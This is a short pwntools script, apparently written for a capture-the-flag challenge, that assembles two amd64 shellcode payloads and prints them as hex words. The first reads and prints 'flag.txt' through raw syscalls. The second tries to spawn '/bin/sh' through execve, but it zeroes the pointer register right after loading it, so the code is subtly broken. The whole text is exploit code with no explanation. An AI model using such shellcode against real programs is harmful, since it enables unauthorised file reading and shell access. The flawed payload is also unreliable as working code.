from pwn import *

context.arch = 'amd64'

shellcode = asm('''
    lea rdi, [rip+filename]
    xor esi, esi
    mov eax, 2
    syscall

    mov edi, eax
    mov rsi, rsp
    mov rdx, 0x1000
    xor eax, eax
    syscall

    mov edi, 1
    mov edx, eax
    mov eax, 1
    syscall

    filename:
    .string "flag.txt"
''')

shellcode = asm('''
    lea rdi, [rip+binsh]
    xor esi, esi
    xor edi, edi
    mov eax, 0x3b
    syscall

    binsh:
    .string "/bin/sh"
''')

print(repr([hex(u32(shellcode[i:i+4].ljust(4, b'\x00'))) for i in range(0, len(shellcode), 4)]).replace("'", ''))
